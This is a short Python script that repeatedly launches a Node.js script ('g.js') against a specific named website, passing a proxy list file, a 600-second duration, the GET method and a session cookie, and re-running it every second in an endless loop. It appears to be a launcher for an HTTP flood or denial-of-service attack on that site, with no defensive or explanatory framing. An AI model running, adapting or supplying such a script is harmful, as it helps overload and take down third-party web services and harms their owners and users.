import schedule
import time
import os
import sys

os.system('node g.js https://sait-essentiel.ckgroup.ph http.txt 600 GET PHPSESSID:a0rrv9fptjahscpc64jij9vug0')

def job():
    os.system('node g.js https://sait-essentiel.ckgroup.ph http.txt 600 GET PHPSESSID:a0rrv9fptjahscpc64jij9vug0')
    
schedule.every(1).seconds.do(job)

while True:
    schedule.run_pending()
    time.sleep(1)